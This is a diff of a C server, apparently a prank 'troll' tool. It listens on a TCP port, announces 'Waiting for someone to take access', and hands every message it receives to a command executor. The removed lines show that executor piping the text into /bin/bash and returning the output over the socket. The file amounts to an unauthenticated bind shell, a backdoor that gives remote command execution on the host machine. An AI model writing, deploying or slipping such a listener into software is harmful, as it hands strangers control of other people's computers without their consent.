@@ -10,7 +10,6 @@
 /*                                                                            */
 /* ******************************--------************************************ */
 
-#include <pthread.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -18,48 +17,22 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <signal.h>
 #include "server.h"
 #include "libft.h"
-#include "get_next_line.h"
 
-static void		launch_get_output(int infd, int outfd)
+static int		g_sockfd;
+
+static void		sigint_hdl(int sigc)
 {
-	int				args[2];
-	pthread_t		thread;
-
-	args[0] = infd;
-	args[1] = outfd;
-	pthread_create(&thread, NULL, &send_output, (void*)&args);
-	pthread_detach(thread);
-}
-
-static void		exec_command(char *msg, char **env, int outfd)
-{
-	pid_t			pid;
-	char			*bashav[2];
-	int				fd[2];
-	int				fd2[2];
-
-	bashav[0] = "bash";
-	bashav[1] = NULL;
-	pipe(fd);
-	pipe(fd2);
-	ft_putstr_fd(msg, fd[1]);
-	if ((pid = fork()) == -1)
+	if (sigc != SIGINT)
 		return ;
-	if (pid == 0)
-	{
-		prepare_pipe_child(fd, fd2);
-		execve("/bin/bash", bashav, env);
-		exit(127);
-	}
-	close(fd[1]);
-	close(fd[0]);
-	close(fd2[1]);
-	launch_get_output(fd2[0], outfd);
+	ft_putendl("\nByeBye!");
+	close(g_sockfd);
+	exit(0);
 }
 
-static int		get_admin_message(int sockfd, int newsockfd, char **env)
+static int		get_admin_message(int sockfd, int newsockfd)
 {
 	struct pollfd		pfd;
 	char				msg[256];
@@ -80,7 +53,7 @@ static int		get_admin_message(int sockfd, int newsockfd, char **env)
 				close(newsockfd);
 				return (FALSE);
 			}
-			exec_command(msg, env, newsockfd);
+			exec_command(msg, newsockfd);
 		}
 	}
 	close(newsockfd);
@@ -95,29 +68,30 @@ static void		setup_sockaddr(t_sockaddr_in *dest)
 	dest->sin_port = htons(TROLL_PORT);
 }
 
-int				main(int ac, char **av, char **env)
+int				main(int ac, char **av)
 {
-	int					sockfd;
-	int					newsockfd;
+	int					nsockfd;
 	t_sockaddr_in		serv_addr;
 	t_sockaddr_in		client_addr;
 	socklen_t			len;
 
-	(void)ac;
-	(void)av;
-	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	if (ac > 1)
+		chdir(av[1]);
+	if ((g_sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
 		return (ft_returnmsg("Err socket", STDERR_FILENO, EXIT_FAILURE));
 	setup_sockaddr(&serv_addr);
-	if (bind(sockfd, (t_sockaddr*)&serv_addr, sizeof(t_sockaddr_in)) == -1)
+	if (bind(g_sockfd, (t_sockaddr*)&serv_addr, sizeof(t_sockaddr_in)) == -1)
 		return (ft_returnmsg("Err bind", STDERR_FILENO, EXIT_FAILURE));
+	signal(SIGINT, &sigint_hdl);
+	ft_putendl("Waiting for someone to take access");
 	while (TRUE)
 	{
-		listen(sockfd, 1);
+		listen(g_sockfd, 1);
 		len = sizeof(t_sockaddr_in);
-		if ((newsockfd = accept(sockfd, (t_sockaddr*)&client_addr, &len)) == -1
-			|| !get_admin_message(sockfd, newsockfd, env))
+		if ((nsockfd = accept(g_sockfd, (t_sockaddr*)&client_addr, &len)) == -1
+			|| !get_admin_message(g_sockfd, nsockfd))
 			break ;
 	}
-	close(sockfd);
+	close(g_sockfd);
 	return (EXIT_SUCCESS);
 }
